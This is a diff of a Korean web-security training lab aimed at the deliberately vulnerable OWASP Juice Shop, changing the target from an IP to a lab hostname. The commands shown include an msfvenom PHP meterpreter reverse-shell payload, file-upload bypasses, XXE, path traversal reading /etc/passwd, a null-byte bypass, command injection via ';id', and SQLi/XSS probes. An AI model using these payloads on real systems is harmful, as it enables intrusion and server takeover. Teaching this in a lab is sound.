@@ -110,7 +110,7 @@
 > # fuxploider — 파일 업로드 취약점 자동 fuzzer
 > git clone https://github.com/almandin/fuxploider.git ~/fuxploider
 > cd ~/fuxploider && pip3 install -r requirements.txt
-> python3 fuxploider.py --url http://10.20.40.81:3000/file-upload --not-regex "error"
+> python3 fuxploider.py --url http://juice.6v6.lab/file-upload --not-regex "error"
 >
 > # msfvenom — 다양한 webshell payload (대안)
 > msfvenom -p php/meterpreter/reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f raw -o /tmp/php_meter.php
@@ -129,7 +129,7 @@
 > **실전 활용**: 파일 업로드 취약점은 웹쉘을 통한 서버 장악의 직접적 경로이므로 CRITICAL로 분류된다
 
 ```bash
-TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
+TOKEN=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
   -H 'Content-Type: application/json' \
   -d '{"email":"student@test.com","password":"Test1234!"}' \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
@@ -142,7 +142,7 @@ cp /tmp/shell.php /tmp/shell.php.png
 for label_file in "정상_PNG=/tmp/test.png:" "악성_PHP=/tmp/shell.php:" "이중확장자_PHP_PNG=/tmp/shell.php.png:" "MIME위조=/tmp/shell.php:type=image/png"; do
   label="${label_file%%=*}"
   fopt="${label_file#*=}"
-  code=$(curl -s -o /tmp/upload_resp.txt -w "%{http_code}" -X POST http://10.20.40.81:3000/file-upload \
+  code=$(curl -s -o /tmp/upload_resp.txt -w "%{http_code}" -X POST http://juice.6v6.lab/file-upload \
     -H "Authorization: Bearer $TOKEN" -F "file=@${fopt}")
   echo "[$code] $label → $(head -c 100 /tmp/upload_resp.txt)"
 done
@@ -172,7 +172,7 @@ done
 
 # 정상: PDF 파일
 echo "%PDF-1.4 fake pdf" > /tmp/complaint.pdf
-curl -s -X POST http://10.20.40.81:3000/file-upload \
+curl -s -X POST http://juice.6v6.lab/file-upload \
   -H "Authorization: Bearer $TOKEN" \
   -F "file=@/tmp/complaint.pdf" | python3 -m json.tool 2>/dev/null
 echo ""
@@ -186,14 +186,14 @@ cat > /tmp/xxe.xml << 'XMLEOF'
 <root>&xxe;</root>
 XMLEOF
 
-curl -s -X POST http://10.20.40.81:3000/file-upload \
+curl -s -X POST http://juice.6v6.lab/file-upload \
   -H "Authorization: Bearer $TOKEN" \
   -F "file=@/tmp/xxe.xml" | python3 -m json.tool 2>/dev/null
 echo ""
 
 # 대용량 파일 업로드 (크기 제한 테스트)
 dd if=/dev/zero of=/tmp/bigfile.pdf bs=1M count=10 2>/dev/null
-curl -s -X POST http://10.20.40.81:3000/file-upload \
+curl -s -X POST http://juice.6v6.lab/file-upload \
   -H "Authorization: Bearer $TOKEN" \
   -F "file=@/tmp/bigfile.pdf" | python3 -m json.tool 2>/dev/null
 rm -f /tmp/bigfile.pdf                                 # 파일 삭제
@@ -204,8 +204,8 @@ rm -f /tmp/bigfile.pdf                                 # 파일 삭제
 ```bash
 # 5 후보 디렉토리에 업로드된 파일이 웹 접근 가능한지
 for dir in "uploads" "file-upload" "assets/public/images/uploads" "ftp" "static/uploads"; do
-  code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.40.81:3000/$dir/")
-  size=$(curl -o /dev/null -s -w "%{size_download}" "http://10.20.40.81:3000/$dir/test.png")
+  code=$(curl -o /dev/null -s -w "%{http_code}" "http://juice.6v6.lab/$dir/")
+  size=$(curl -o /dev/null -s -w "%{size_download}" "http://juice.6v6.lab/$dir/test.png")
   echo "[$code] /$dir/  (test.png size=${size}B)"
 done
 ```
@@ -256,7 +256,7 @@ done
 ```bash
 # 정상 baseline
 echo "=== 정상 ==="
-curl -s -o /dev/null -w "code=%{http_code} size=%{size_download}\n" http://10.20.40.81:3000/ftp/legal.md
+curl -s -o /dev/null -w "code=%{http_code} size=%{size_download}\n" http://juice.6v6.lab/ftp/legal.md
 
 # 5 가지 페이로드 비교 — 각 우회 기법
 echo "=== Path Traversal 페이로드 5종 ==="
@@ -268,7 +268,7 @@ PAYLOADS=(
   "..%c0%af..%c0%af..%c0%afetc/passwd"           # UTF-8 overlong (오래된 IIS/Apache)
 )
 for payload in "${PAYLOADS[@]}"; do
-  code=$(curl -s -o /tmp/lfi_resp.txt -w "%{http_code}" "http://10.20.40.81:3000/ftp/$payload")
+  code=$(curl -s -o /tmp/lfi_resp.txt -w "%{http_code}" "http://juice.6v6.lab/ftp/$payload")
   if grep -q "root:" /tmp/lfi_resp.txt; then
     echo "[$code 성공★] $payload"
     head -2 /tmp/lfi_resp.txt
@@ -310,12 +310,12 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 # 1) 직접 .bak 다운로드 (확장자 차단 확인)
 echo "=== 1) 직접 .bak ==="
 curl -s -o /tmp/bak1.txt -w "code=%{http_code} size=%{size_download}\n" \
-  http://10.20.40.81:3000/ftp/package.json.bak
+  http://juice.6v6.lab/ftp/package.json.bak
 
 # 2) Null byte (%2500 = %00 의 double encoding) — JuiceShop 우회 페이로드
 echo "=== 2) Poison Null Byte (%2500.md) ==="
 curl -s -o /tmp/bak2.txt -w "code=%{http_code} size=%{size_download}\n" \
-  "http://10.20.40.81:3000/ftp/package.json.bak%2500.md"
+  "http://juice.6v6.lab/ftp/package.json.bak%2500.md"
 echo '[추출된 파일 내용 일부]'
 head -10 /tmp/bak2.txt
 ```
@@ -387,7 +387,7 @@ os.system(f"cat /uploads/{filename}")  # 위험!
 # 비디오 자막, 이미지 처리 등의 기능이 OS 명령을 사용할 수 있음
 
 # 1. B2B 주문 기능 (XML/파일 처리)
-curl -s -X POST http://10.20.40.81:3000/b2b/v2/orders \
+curl -s -X POST http://juice.6v6.lab/b2b/v2/orders \
   -H "Content-Type: application/xml" \
   -H "Authorization: Bearer $TOKEN" \
   -d '<?xml version="1.0"?>                            # 요청 데이터(body)
@@ -398,14 +398,14 @@ curl -s -X POST http://10.20.40.81:3000/b2b/v2/orders \
 echo ""
 
 # 2. 프로필 이미지 URL 처리
-curl -s -X POST http://10.20.40.81:3000/profile/image/url \
+curl -s -X POST http://juice.6v6.lab/profile/image/url \
   -H "Content-Type: application/json" \
   -H "Authorization: Bearer $TOKEN" \
   -d '{"imageUrl":"http://localhost; id"}' | head -10  # 요청 데이터(body)
 echo ""
 
 # 3. 검색 기능에서 시도
-curl -s "http://10.20.40.81:3000/rest/products/search?q=test;id" | head -5  # silent 모드
+curl -s "http://juice.6v6.lab/rest/products/search?q=test;id" | head -5  # silent 모드
 ```
 
 ### 3.4 다양한 페이로드 테스트
@@ -427,7 +427,7 @@ echo "=== Command Injection 8 페이로드 테스트 ==="
 for payload in "${CMDI_PAYLOADS[@]}"; do
   encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "test${payload}")
   start=$(date +%s%N)
-  curl -s --max-time 5 -o /tmp/cmdi.txt "http://10.20.40.81:3000/rest/products/search?q=$encoded"
+  curl -s --max-time 5 -o /tmp/cmdi.txt "http://juice.6v6.lab/rest/products/search?q=$encoded"
   elapsed=$(( ($(date +%s%N) - start) / 1000000 ))
   body=$(head -c 60 /tmp/cmdi.txt)
   echo "[${elapsed}ms] test$payload → ${body}"
@@ -461,7 +461,7 @@ done
 > ```bash
 > # commix — sqlmap 의 command injection 버전
 > sudo apt install commix
-> commix -u "http://10.20.40.81:3000/rest/products/search?q=test*" --batch
+> commix -u "http://juice.6v6.lab/rest/products/search?q=test*" --batch
 > # * 위치에 페이로드 자동 삽입 + os-shell 자동 spawn
 > ```
 
@@ -472,10 +472,10 @@ done
 echo "=== Time-based Detection ==="
 
 echo "정상 요청:"
-time curl -s -o /dev/null "http://10.20.40.81:3000/rest/products/search?q=apple" 2>&1 | grep real
+time curl -s -o /dev/null "http://juice.6v6.lab/rest/products/search?q=apple" 2>&1 | grep real
 
 echo "sleep 주입:"
-time curl -s -o /dev/null --max-time 10 "http://10.20.40.81:3000/rest/products/search?q=apple;sleep+3" 2>&1 | grep real
+time curl -s -o /dev/null --max-time 10 "http://juice.6v6.lab/rest/products/search?q=apple;sleep+3" 2>&1 | grep real
 
 # 응답 시간이 3초 이상 차이나면 명령어 주입 가능
 ```
@@ -525,8 +525,8 @@ CMDi                 200  통과 ✗
 echo "=== WAF 보호 비교 ==="
 echo ""
 echo "JuiceShop (포트 3000, WAF 없음):"
-curl -s -o /dev/null -w "  SQLi: %{http_code}\n" "http://10.20.40.81:3000/rest/products/search?q='+OR+1=1--"  # silent 모드
-curl -s -o /dev/null -w "  XSS: %{http_code}\n" "http://10.20.40.81:3000/rest/products/search?q=<script>alert(1)</script>"  # silent 모드
+curl -s -o /dev/null -w "  SQLi: %{http_code}\n" "http://juice.6v6.lab/rest/products/search?q='+OR+1=1--"  # silent 모드
+curl -s -o /dev/null -w "  XSS: %{http_code}\n" "http://juice.6v6.lab/rest/products/search?q=<script>alert(1)</script>"  # silent 모드
 
 echo ""
 echo "Apache (포트 80, ModSecurity):"
@@ -595,7 +595,7 @@ curl -s -o /dev/null -w "  XSS: %{http_code}\n" "http://10.20.32.80:80/?q=<scrip
 
 ### Burp Suite Community
 > **역할:** 웹 프록시 기반 수동/반자동 취약점 점검 도구  
-> **실행 위치:** `작업 PC → web (10.20.40.81:3000)`  
+> **실행 위치:** `학생 PC (브라우저 / curl) → fw HAProxy → web (juice.6v6.lab)`  
 > **접속/호출:** GUI `burpsuite`, CA 인증서 신뢰 필요 (`http://burp`)
 
 **주요 경로·파일**
